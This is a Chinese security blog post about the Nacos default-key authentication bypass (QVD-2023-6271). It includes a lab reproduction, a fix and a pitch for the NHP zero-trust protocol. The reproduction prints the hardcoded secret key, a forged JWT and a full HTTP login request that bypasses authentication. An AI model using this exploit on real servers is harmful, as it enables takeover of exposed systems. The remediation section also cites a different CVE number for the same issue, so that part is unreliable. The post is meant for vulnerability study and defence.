---
title: 强化Nacos安全性：从传统安全到创新NHP协议的演进
date: '2024-01-08T10:00:00+08:00'
draft: false
description: 在过去四年中，笔者通过参与各种攻防演练、护网行动和重点保障任务，深刻地认识到了传统网络安全策略的局限性。这些实战经验不仅让圈子加深了对网络安全、数字安全领域的理解，也揭示了在不断演变的威胁环境中，传统安全措施如何变得不再充分...
summary: 在过去四年中，笔者通过参与各种攻防演练、护网行动和重点保障任务，深刻地认识到了传统网络安全策略的局限性。这些实战经验不仅让圈子加深了对网络安全、数字安全领域的理解，也揭示了在不断演变的威胁环境中，传统安全措施如何变得不再充分...
categories:
- 技术好文
- 零信任
tags:
- 技术实践
- 零信任
- 漏洞研究
- 实操指南
keywords:
- 技术实践
- 零信任
- 漏洞研究
- 实操指南
- 技术好文
- BlueDog
---
## 0x01 概述

在过去四年中，笔者通过参与各种攻防演练、护网行动和重点保障任务，深刻地认识到了传统网络安全策略的局限性。这些实战经验不仅让圈子加深了对网络安全、数字安全领域的理解，也揭示了在不断演变的威胁环境中，传统安全措施如何变得不再充分。尤其在2023年护网中，Nacos的0day漏洞事件圈内引起了广泛关注。

在这种背景下，传统的安全产品，如防火墙和Web应用防火墙（WAF），在应对这种应用层漏洞方面显得力不从心。这些产品虽然能有效防御某些网络层面的攻击，但面对复杂的应用层漏洞，如Nacos所面临的身份认证绕过问题，它们往往无法提供足够的保护。此外，面对这类漏洞，打补丁的周期往往较长，意味着系统在漏洞被公开和修复之前，持续处于高风险状态，造成HW行动中被打穿 。

本文旨在通过Nacos的`QVD-2023-6271`这一漏洞，探讨传统安全产品在应对复杂网络威胁时的局限性，并介绍一种新兴的网络安全方法——网络资源超隐身协议（NHP协议），NHP协议作为零信任安全框架的核心组件之一，专为网络环境中的资源隐身和安全访问设计，在“永不信任、持续验证”的安全理念指导下，通过一套严格的身份验证和授权流程来控制数据资源的访问。这种方法在Nacos的应用场景中显著增强了系统的安全性。通过将NHP协议应用于Nacos，不仅能有效应对特定的安全挑战，如身份认证绕过漏洞，还能在更广泛的层面上提升整个系统的安全性和韧性。这篇文章将深入探讨NHP协议在增强Nacos安全性中的应用，以及其相较于传统安全产品的优势。

![image-20240108101645007](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401081016495.png)

## 0x02 漏洞影响范围

Nacos是阿里巴巴开源的SpringCloud Alibaba项目下的一项技术。Nacos是一个用于动态配置管理、服务发现和服务管理的平台，它可以帮助开发人员更容易地构建和管理微服务架构的应用程序。它提供了一种集中的方式来管理配置信息，同时还可以用于发现和注册微服务，以确保它们能够有效地通信和协作。这使得Nacos成为构建分布式系统的强大工具之一。目前Github该仓库已有28.3k+的star

漏洞介绍：开源服务管理平台 Nacos 中存在身份认证绕过漏洞，在默认配置下未对 token.secret.key 进行修改，导致远程攻击者可以绕过密钥认证进入后台，造成系统受控等后果。

影响版本：Nacos <= 2.2.0

利用难度：低

漏洞编号：`NVDB-CNVDB-2023674205`    `QVD-2023-6271`

威胁等级：严重，能够造成远程代码执行

综合评价：漏洞利用难度低，且在外网情况下可以造成远程代码执行，且已被公开，可被黑客利用进行全网扫描

## 0x03 攻击原理

在nacos中，token.secret.key值是固定的

![image-20240107203717097](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401072037120.png)

```
key=SecretKey012345678901234567890123456789012345678901234567890123456789
```

利用该默认key可进行jwt构造，直接进入后台

![image-20240107184404462](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401071934947.png)

## 0x04 复现步骤

| IP地址        | 用途        | 备注                                   |
| ------------- | ----------- | -------------------------------------- |
| 172.17.0.1    | 靶机        | 通过配置docker容器，搭建启动docker服务 |
| 192.168.31.31 | 攻击机 Kali | 攻击机                                 |

### 4.1 环境机搭建

#### 4.1.1 Windows环境搭建

该漏洞用到了JAVA环境，参考网上已有的复现文章，使用jdk-11.0.2_windows-x64_bin.exe

下载链接：https://github.com/alibaba/nacos/releases/tag/2.2.0

由于2.2.0后的nacos已经将该漏洞修复，所以使用2.2.0的包

下载完成之后放到虚拟机，执行`startup.cmd -m standalone` 

执行成功后即可在本地启动nacos

![img](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401071934220.png)

看到如上图输出信息后即代表搭建成功，通过路径访问

```bash
http://192.168.31.31:8848/nacos/#/login
```

![img](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401071934045.png)

#### 4.1.2 Linux下docker搭建nacos

本次漏洞复现使用docker进行漏洞复现，docker中执行以下命令即可

```bash
docker search nacos #寻找合适的nacos版本
docker pull nacos/nacos-server #下载镜像
```

![image-20240107183035913](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401071935093.png)

设置挂载

```bash
mkdir -p /tmp/nacos/logs/                      #新建logs目录
mkdir -p /tmp/nacos/init.d/  
```

修改配置文件

```bash
vim /tmp/nacos/init.d/custom.properties 
server.contextPath=/nacos
server.servlet.contextPath=/nacos
server.port=8848
spring.datasource.platform=mysql
db.num=1
db.url.0=jdbc:mysql://127.0.0.1:3306/nacos-config? characterEncoding=utf8&connectTimeout=1000&socketTimeout=3000&autoReconnect=true #这里需要修改端口
db.user=root #用户名
db.password=123456 #密码
nacos.cmdb.dumpTaskInterval=3600
nacos.cmdb.eventTaskInterval=10
nacos.cmdb.labelTaskInterval=300
nacos.cmdb.loadDataAtStart=false
management.metrics.export.elastic.enabled=false
management.metrics.export.influx.enabled=false
server.tomcat.accesslog.enabled=true
server.tomcat.accesslog.pattern=%h %l %u %t "%r" %s %b %D %{User-Agent}i
nacos.security.ignore.urls=/,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-fe/public/**,/v1/auth/login,/v1/console/health/**,/v1/cs/**,/v1/ns/**,/v1/cmdb/**,/actuator/**,/v1/console/server/**
nacos.naming.distro.taskDispatchThreadCount=1
nacos.naming.distro.taskDispatchPeriod=200
nacos.naming.distro.batchSyncKeyCount=1000
nacos.naming.distro.initDataRatio=0.9
nacos.naming.distro.syncRetryDelay=5000
nacos.naming.data.warmup=true
nacos.naming.expireInstance=true

```

启动容器

```
docker run --name nacos -d -p 8848:8848 -p 9848:9848 --privileged=true --restart=always -e JVM_XMS=256m -e JVM_XMS=256m -e MODE=standalone -e PREFER_HOST_MODE=hostname -e PREFER_HOST_MODE=hostname -v /tmp/nacos/logs:/home/nacos/logs  -v /tmp/nacos/init.d/custom.properties:/home/nacos/init.d/custom.properties nacos/nacos-server
```

成功启动容器之后 似乎docker存在某些问题，执行以下命令即可正常启动容器

``` bash
docker exec -it [容器哈希] /bin/bash #进入docker容器
cd bin
sh docker-startup.sh
```

访问网站 http://192.168.31.31:8848/nacos

成功打开网站

![image-20240107184102007](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401071935732.png)

### 4.2 漏洞复现

在nacos中，token.secret.key是死的，位置在conf目录下application.properties中

我的环境中key值为：`SecretKey012345678901234567890123456789012345678901234567890123456789}`

利用该值可以进行JWT构造，访问https://jwt.io/ 输入默认的key值

```
{
  "alg": "HS256",
  "typ": "JWT"
}

{
   "sub":"nacos",
   "exp":"1704724306"
}
```

![image-20240107191207740](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401071935269.png)

这里exp的值为当前时间戳往后的时间，要比真实时间更晚。

需要注意的是在网站中，需要勾选`secret base64 encoded`选项

在数据包中添加`Authorization`请求包如下

```bash
POST /nacos/v1/auth/users/login HTTP/1.1
Host: 192.168.31.31:8848
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://139.196.217.155
Connection: close
Referer: http://139.196.217.155/nacos/
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjE3MDQ3MjQzMDYifQ.tjGozAqCoY1r0AKy8fnF1qORQAtF-7-dDrnBR2t2-08

username=admin&password=123456
```

将数据包发出并截停回 包，拿到了access_token

![image-20240107190217940](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401071936386.png)

将得到的信息全部复制保存，再进行正常登录，截停回包，将返回包修改为复制的信息，即可正常完成登录

![image-20240107191145885](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401071936073.png)

## 0x05 修复方案

一、升级到最新版本

二、删除默认配置中的下列选项，启动nacos时必须手动配置

通过修改conf/application.properties文件即可以

```bash
nacos.core.auth.server.identity.key
nacos.core.auth.server.identity.value
nacos.core.auth.plugin.nacos.token.secret.key
```

1. 修改 nacos的application.properties配置文件nacos.core.auth.enabled=true，开启服务身份识别功能
2. 重启nacos

此时我们再访问刚才的接口，换在浏览器执行如果出现这个： 

![img](https://raw.githubusercontent.com/B1ueD0g/Picture/main/202401072105775.png)

出现403的说明修改成功

3. Nacos注册及配置中心开启权限认证

![img](https://ucc.alicdn.com/images/user-upload-01/img_convert/a7615d9c42aff4abadb8545f468a2790.png)

以上修改完成以后，再次漏扫，nacos权限绕过漏洞(CVE-2021-29441)不会再出现。

## 0x06 传统安全产品与Nacos漏洞处理的局限性

在网络安全领域，传统安全产品，如阿里云安全中心（原云骑士），虽然提供了基础的保护措施，但在应对复杂和高级的安全威胁时，它们的能力可能显得不足。以Nacos漏洞为例，传统安全产品主要依赖于推荐应用升级或修改服务器配置文件这类被动和通用的策略。这种方法虽然对于即时防御某些已知漏洞有效，但在根本上并没有解决安全漏洞的潜在风险。

阿里云安全中心在发现Nacos身份认证绕过漏洞后，推荐的修复策略主要是应用升级，以及对原生云服务器应用的配置文件进行修改。这种做法虽然能够在一定程度上提供防护，但它并没有提供一个系统性的解决方案来应对更深层次的安全问题。例如，仅靠升级应用并不能完全避免未来的安全漏洞，而直接修改配置文件可能会对应用的正常运行造成影响。更重要的是，这类传统安全产品通常只在面对已知威胁时才能提供有效的防护措施。它们往往缺乏对未知威胁的预防能力，无法主动识别和防御尚未发现的安全漏洞。此外，依赖于云服务提供商进行安全干预，可能会导致客户对自己的安全状况产生依赖，从而忽视了自身在安全管理和持续监控方面的责任。

因此，在处理像Nacos这样的复杂漏洞时，单靠传统云安全产品可能不足以提供充分的保护。为了真正提升安全性和减少对外部服务的依赖，需要探索更先进、更主动的安全措施，比如NHP（网络资源超隐身）协议。接下来的部分将详细探讨NHP协议在增强Nacos安全性方面的应用，以及它相较于传统云安全产品的优势。

## 0x07 NHP协议在增强Nacos安全性中的应用

### 7.1 NHP协议概述

网络资源超隐身协议（NHP）是零信任安全框架的核心组件之一，专为网络环境中的资源隐身和安全访问设计。在“永不信任、持续验证”的零信任安全理念指导下，NHP协议通过一套严格的身份验证和授权流程来控制数据资源的访问，从而确保仅经过身份认证和权限鉴别的合法请求者才能访问到目标资源。NHP协议的技术架构包括NHP代理、NHP服务器和NHP门禁等组件，协同工作以隐藏数据资源的真实网络位置，提供安全的授权访问。

### 7.2 NHP协议与Nacos安全性

在Nacos的应用场景中，NHP协议的应用可以显著增强系统的安全性。针对Nacos面临的身份认证绕过漏洞，NHP协议提供了一种有效的防御机制。通过NHP，Nacos服务器可以在网络上实现“隐身”，即在未经验证的情况下，对潜在的攻击者或非授权用户不可见。NHP协议中的敲门流程确保了只有经过认证的请求者才能发现并接触到Nacos服务器，大大减少了未授权访问和潜在攻击的机会。此外，NHP协议通过其分布式架构和高效的加密通信机制，为Nacos提供了一层额外的安全保护，确保了数据通信的完整性和机密性。

### 7.3 NHP协议的优势

NHP协议在增强Nacos安全性方面的应用带来了多方面的优势。首先，它通过隐藏Nacos服务的网络位置，显著降低了被恶意扫描和识别的风险。其次，NHP协议的身份验证和授权机制为Nacos提供了更强的访问控制，确保只有经过严格认证的用户才能访问服务。这一点对于防御身份认证漏洞尤为关键。此外，NHP协议的设计还考虑了性能和可扩展性，确保在提高安全性的同时，不会对Nacos系统的性能产生过大影响。最后，NHP协议的应用有助于提高Nacos系统的整体安全态势，使其更加适应当今复杂多变的网络安全环境。

总体而言，将NHP协议应用于Nacos不仅能有效应对特定的安全挑战，如身份认证绕过漏洞，还能在更广泛的层面上提升整个系统的安全性和韧性。这使得NHP协议成为提升Nacos安全架构的重要组成部分，为保护关键的数据资源提供了一种创新且有效的方法。
